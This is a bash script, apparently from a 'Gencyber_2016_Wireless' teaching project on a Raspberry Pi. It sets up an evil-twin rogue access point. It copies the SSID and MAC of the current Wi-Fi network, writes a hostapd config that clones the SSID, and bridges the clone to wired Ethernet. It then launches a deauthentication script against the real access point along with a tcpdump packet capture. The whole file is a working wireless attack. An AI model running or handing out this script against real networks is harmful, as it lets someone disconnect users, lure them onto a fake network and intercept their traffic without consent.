#!/bin/bash

# Find the essid
ap=$(iwconfig)

isNext="no"
essid=""
mac=""

for token in $ap
do
  if [ "${token:0:6}" == "ESSID:" ]
    then
      if [ "$essid" == "" ]
        then
          essid=${token:6}
      fi
  fi
  if [ "$isNext" == "yes" ]
    then
      if [ "$mac" == "" ]
        then
          mac=$token
          isNext="no"
      fi
  fi
  if [ "$token" == "Point:" ]
    then
      isNext="yes"
  fi

done

essid=${essid#'"'}
essid=${essid%'"'}

# Find the interface of the Ralink
iface=$(sudo airmon-ng | grep "Ralink")
iface=${iface:0:5}

# Edit the /etc/hostapd/hostapd.conf configuration file
{
  echo "interface=$iface"
  echo "driver=nl80211"
  echo "ssid=$essid"
  echo "channel=6"
} > /etc/hostapd/hostapd.conf

# Create the bridge and add the interfaces to it
sudo ip addr flush dev eth0
sudo iw dev $iface set 4addr on
sudo brctl addbr br0
sudo brctl addif br0 eth0 $iface
sudo ifconfig br0 down
sudo ifconfig br0 up

# Start the AP, start sending deauth, start recording
sudo hostapd /etc/hostapd/hostapd.conf &
sudo /home/pi/Gencyber_2016_Wireless/run_deauth.sh $iface $mac &
sudo /home/pi/Gencyber_2016_Wireless/run_tcpdump.sh $iface &

